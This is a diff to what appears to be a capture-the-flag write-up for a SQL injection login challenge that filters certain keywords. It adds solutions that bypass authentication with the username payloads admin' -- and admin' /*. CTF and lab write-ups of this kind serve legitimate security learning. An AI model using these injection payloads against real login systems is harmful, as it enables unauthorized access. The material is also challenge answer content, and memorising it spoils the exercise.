@@ -14,15 +14,25 @@ The other links show the filtered words.
 ## Solution: 💯
 ### Round 1:
 
-Login as admin so the username=admin, and sqli here.
-
 Filter: `or`
+
+Login as admin so the username=admin, and sqli here.
 
 User: `admin' --`
 
 Pass: `123456` (arbitary string)
 
 ### Round 2:
+
+Filter: `or and like = --`
+
+Login as admin. Change comment out operator "--" to "/*"
+
+User: `admin' /*`
+
+Password: `123456` (arbitary string)
+
+
 ### Round 3:
 ### Round 4:
 ### Round 5:
